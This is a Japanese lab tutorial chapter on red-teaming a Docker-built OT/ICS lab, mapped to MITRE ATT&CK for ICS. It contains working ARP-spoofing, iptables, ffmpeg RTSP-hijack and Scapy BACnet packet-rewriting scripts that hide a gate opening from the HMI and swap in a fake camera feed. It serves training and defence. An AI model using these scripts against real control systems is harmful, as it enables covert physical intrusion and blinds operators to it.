---
title: "第9章：HMI視野の完全欺瞞と通信傍受・改ざんのシミュレーション"
---

# 第9章：HMI視野の完全欺瞞と通信傍受・改ざんのシミュレーション

---

## 1. はじめに

本書では、Dockerを使って自宅PCに本物さながらのOT（制御システム）セキュリティ・ラボを構築してきました。

前章（第8章）で、「Modbusセンサー」「BACnetによる自動門扉」「RTSPによる監視カメラ」の3大インフラが揃い、パケットレベルでもOTとITのトラフィックが混在するリアルなインフラシステムが完成しました。

本章からは、いよいよこの完成したシステムに対して攻撃を仕掛ける **「攻撃シナリオフェーズ（Red Teaming演習）」** に突入します。

---

## 2. コンセプト：単なる破壊から「隠蔽と欺瞞」へ

これまでのフェーズ（Modbusへの単純な書き込み等）からレベルを一段引き上げます。

攻撃者は単にプロトコルを悪用して設備を動かすだけでなく、**「MITRE ATT&CK for ICS」** に基づいた、より現実的で高度な攻撃チェーン（Kill Chain）を再現します。

目標は、**「オペレーター（HMI）の監視の目を完全に欺きながら（Denial of View / 隠蔽）、物理的な目的を達成する」** ことです。これは、かつてイランの核施設を標的としたマルウェア「Stuxnet」が用いたような、極めて洗練された手口のシミュレーションとなります。

---

### MITRE ATT&CK for ICS とは？

MITRE ATT&CK for ICS は、産業制御システム（ICS/OT）を標的とする攻撃者が実際に用いる戦術（Tactics）と技術（Techniques）を体系化した国際的なナレッジベースです。

一般的なIT環境向けのサイバー攻撃フレームワークとは異なり、OT網特有の「物理プロセスの阻害（Impair Process Control）」や「オペレーターからの視界の剥奪（Denial of View）」といった、現実世界・物理機器に直結する攻撃手法が細かく定義されています。

本演習では、このフレームワークに沿って「実際の高度な攻撃者（APT）が重要インフラを狙う際に用いるキルチェーン」を忠実に再現・検証していきます。

#### 本演習で再現する MITRE ATT&CK for ICS マッピング一覧表

| 攻撃フェーズ (Tactics) | 実行技術・手口 (TTPs) | MITRE ATT&CK for ICS ID |
| :--- | :--- | :--- |
| **初期侵入 (Initial Access)** | 盗まれた資格情報によるDMZ Jump ServerへのSSH侵入 | `T0822` (Valid Accounts) |
| **探索・集約 (Discovery / Collection)** | OTネットワークの傍受と制御通信パケットの自動収集 | `T0842` (Network Sniffing)<br>`T0802` (Automated Collection) |
| **実行 (Execution)** | 不正な制御コマンドパケットの注入・送出 | `T0855` (Unauthorized Command Message) |
| **物理影響 (Impact)** | BACnet未認証書き込みによる自動門扉の不法開放 | `T0831` (Manipulation of Control) |
| **視界剥奪・応答抑制 (Inhibit Response)** | HMI応答パケット改ざんによるアラート消去 & RTSP映像すり替え | `T0815` (Denial of View)<br>`T0830` (Spoof Reporting Message) |

---

### シナリオの境界条件（Scope & Boundaries）

技術的・教育的な破綻を防ぐため、本シナリオにおいて「ラボ上で実際に再現する範囲」と「前提として想定する範囲」を明確に定義しておきます。

* **[想定] Initial Access（初期侵入）**:
  本演習では、攻撃者が「既にOTネットワーク（`ot_net`）内の端末（例：保守用PCやマルウェア感染したコンテナ）を侵害し、足場（Foothold）を確立している状態」からスタートするものと仮定します。
* **[想定] Physical Impact（物理的な影響）**:
  門扉が開いた後、攻撃者の協力者が物理的に施設内に侵入する行為自体はシミュレーションの範囲外です。
* **[再現] 攻撃者の活動（Kill Chain）**:
  OT網内に確立された足場から、ネットワークの傍受、パケットの改ざん、そして**「オペレーターの視界の剥奪（Denial of View）」**を行いながら、不正な制御信号を送る一連のデジタル攻撃フローを完全に実装・再現します。

---

## 3. 攻撃環境の準備（Kali Linuxコンテナの投入）

上記の「OT網で確立された足場」を再現するため、OT網に特化したKali Linuxコンテナ（`red-team`）をラボ環境に新たに導入します。

* **接続先**: OT網（`ot_net` : `192.168.151.25`）に直接接続
* **搭載ツール**: `nmap`, `ettercap`, `dsniff` (arpspoof), `scapy`, `ffmpeg` 等の攻撃系ツール群

> **💡 なぜKali Linuxを使うのか？**
> OT/ICS専門の攻撃者であっても、ネットワークレベルの傍受やパケット操作の基盤技術はITと同じです。Kali Linuxはネットワーク攻撃ツール（`arpspoof`など）やパケット操作ライブラリ（`Scapy`）が最初から揃っているため、環境構築の手間を省き、攻撃ロジックの検証に集中できる最高のプラットフォームとなります。

---

## 4. 攻撃シナリオの全貌

概念図として以下を用意しました。

![](https://static.zenn.studio/user-upload/359490144f79-20260722.png)

今回のRed Teamingフェーズでは、以下の2つの高度攻撃シナリオを実行します。

---

### 攻撃シナリオ①：門扉の不正リモート開閉 ＋ HMI隠蔽攻撃（高度なMITM）

攻撃者は単にBACnetプロトコルで門扉を開ける（WriteProperty）だけでなく、HMIの定期ポーリング（ReadProperty）に対する応答パケットをリアルタイムに改ざんし、ダッシュボード上の表示を「CLOSED（正常）」に固定し続けます。

#### MITRE ATT&CK for ICS Kill Chain
* **[Discovery] T0842 Network Sniffing**: ネットワークを傍受し、HMI（`.20`）とGate（`.22`）間のBACnet通信を特定。
* **[Collection] T0802 Automated Collection**: スクリプトを用いて制御パケットを自動収集・解析。
* **[Execution / Control] T0855 Unauthorized Command Message**: ゲートに対して不正なBACnet Writeコマンドを送り、門を開ける。
* **[Inhibit Response Function] T0830 Spoof Reporting Message / T0815 Denial of View**: ARP Spoofingにより通信をジャックし、HMIへ向かうBACnet Read応答パケット（ペイロード）をPythonの `Scapy` でリアルタイムに「INACTIVE(閉)」へ書き換える。

---

### 攻撃シナリオ②：監視カメラ映像のすり替え（オーシャンズ11攻撃）

物理的にゲートを通過する様子が監視カメラに映らないよう、RTSPストリームをハイジャックし、HMIにダミー映像を流し込みます。

#### MITRE ATT&CK for ICS Kill Chain
* **[Impair Process Control] T0814 Denial of Service**: ARP Spoofing等を用いて、正規のカメラ（`.24`）からMediaMTX（`.23`）への映像アップロード通信を強制切断（DROP）する。
* **[Inhibit Response Function] T0830 Spoof Reporting Message / T0815 Denial of View**: 正規カメラが切断された隙に、攻撃者（`.25`）が同じRTSPパス（`/cam1`）に対して、事前に用意した偽の映像ストリーム（`fake_feed.mp4`）の配信を開始する。

*(※教育的配慮として、偽映像には「HACKED」の文字や意図的なタイムコードのズレなど、読者が一目で「映像がすり替わった」と理解できる演出を含めます。)*

---

## 5. 実装編：攻撃環境とスクリプトの構築

実際に攻撃スクリプトを構築していきます。

---

### ① 監視カメラ映像のすり替え

まずは、すり替え用のダミー映像を `ffmpeg` を用いて生成します。

```bash
# generate_fake.sh
ffmpeg -f lavfi -i color=c=black:s=640x480:d=10:r=15 \
  -vf "drawtext=text='HACKED':fontcolor=red:fontsize=80:x=(w-text_w)/2:y=(h-text_h)/2" \
  -c:v libx264 -pix_fmt yuv420p -y /data/fake_feed.mp4
```

続いて、正規のカメラ通信を `arpspoof` で遮断しつつ、上記の偽映像をストリーミングするスクリプトです。

```bash
# hijack_rtsp.sh
echo "[*] Initiating DoS on legitimate camera..."
# 正規カメラからMediaMTXへのパケットを物理的にDROPする
iptables -A FORWARD -s 192.168.151.24 -d 192.168.151.23 -j DROP
arpspoof -i eth0 -t 192.168.151.24 192.168.151.23 > /dev/null 2>&1 &
SPOOF_PID=$!

sleep 3 # 切断を待機

echo "[*] Injecting fake video feed to MediaMTX..."
ffmpeg -re -stream_loop -1 -i /data/fake_feed.mp4 -c copy -f rtsp rtsp://192.168.151.23:8554/cam1
```

---

### ② 門扉(BACnet)の隠蔽攻撃

次に、Scapyを用いたBACnetのパケット改ざんスクリプト（Python）です。

Gate（`.22`）からHMI（`.20`）へ返されるUDP通信(ポート47808)を傍受し、ペイロード内の「ACTIVE（開）」を示すバイナリ（`0x91 0x01`）を「INACTIVE（閉）」のバイナリ（`0x91 0x00`）にリアルタイムで置換します。

```python
# mitm_bacnet.py
import os
from scapy.all import *

GATE_IP = "192.168.151.22"
HMI_IP = "192.168.151.20"

def process_packet(pkt):
    if pkt.haslayer(UDP) and pkt[IP].src == GATE_IP and pkt[UDP].sport == 47808:
        raw_data = bytes(pkt[UDP].payload)

        # ACTIVE (91 01) を INACTIVE (91 00) に書き換える
        if b'\x91\x01' in raw_data:
            modified_data = raw_data.replace(b'\x91\x01', b'\x91\x00')
            new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                      UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) / \
                      Raw(load=modified_data)
            send(new_pkt, verbose=0)
        else:
            new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                      UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) / \
                      Raw(load=raw_data)
            send(new_pkt, verbose=0)

# Scapyで改ざんしたパケットのみを通すため、本来のルーティングパケットはDROP
os.system(f"iptables -A FORWARD -s {GATE_IP} -d {HMI_IP} -p udp --sport 47808 -j DROP")
sniff(filter=f"udp and src {GATE_IP} and dst {HMI_IP} and port 47808", prn=process_packet, store=0)
```

これを双方向の `arpspoof` と連動させるシェルスクリプトで起動します。

```bash
# mitm_bacnet.sh
sysctl -w net.ipv4.ip_forward=1 > /dev/null
arpspoof -i eth0 -t 192.168.151.20 192.168.151.22 > /dev/null 2>&1 &
arpspoof -i eth0 -t 192.168.151.22 192.168.151.20 > /dev/null 2>&1 &
python3 /data/mitm_bacnet.py
```

---

## 6. 検証編：実証実験で判明した「MITMのリアルな罠」

上記を実行し、Node-REDダッシュボードを確認すると、見事に映像が「HACKED」にすり替わり、門扉を開けても画面上は閉じたままになる隠蔽（Denial of View）が成功します。

![](https://static.zenn.studio/user-upload/79eccfd8f0f5-20260722.gif)

しかし、実際に本攻撃をテストする中で、教科書通りにはいかない「L2ネットワーク特有の罠」がいくつか判明しました。OTセキュリティを学ぶ上で非常に実践的な知見となります。

### ① 「IPフォワーディング」による映像ストリームの競合対策
`iptables` で正規カメラからのパケットを強制的に `DROP` するルールを追加し、物理遮断することで通信競合を解決しました。

```bash
# 正規カメラ(192.168.151.24)からMediaMTX(192.168.151.23)へ中継(FORWARD)されようとするパケットを破棄
iptables -A FORWARD -s 192.168.151.24 -d 192.168.151.23 -j DROP
```

### ② HMI上のアイコンのフリッカー（チラつき）現象と防御視点考察
このような「表示の一瞬のチラつき」や「ネットワークの不自然な遅延」は、現場のオペレーターやIDS（侵入検知システム）がMITM攻撃に気付くための極めて重要な痕跡（IoC: Indicator of Compromise）となります。
より高度な国家背後ハッカー（APT）であれば、スイッチのMACテーブルを溢れさせる（MAC Flooding）か、あるいはHMI端末自体をマルウェアで直接侵害し、画面描画APIレベルで隠蔽を行うなどしてノイズを消し去ります。

---

## 7. おわりに

構築したOT環境を用いて、レッドチームによる高度なサイバー攻撃の再現（HMI表示隠蔽・映像すり替え）を実証しました。

次回（第10章）は、この攻撃によってネットワーク上に残される痕跡をどのように捕捉・検知し、SIEMやSOCの可視化基盤として統合・インシデントレスポンスへつなげるかを解説します。
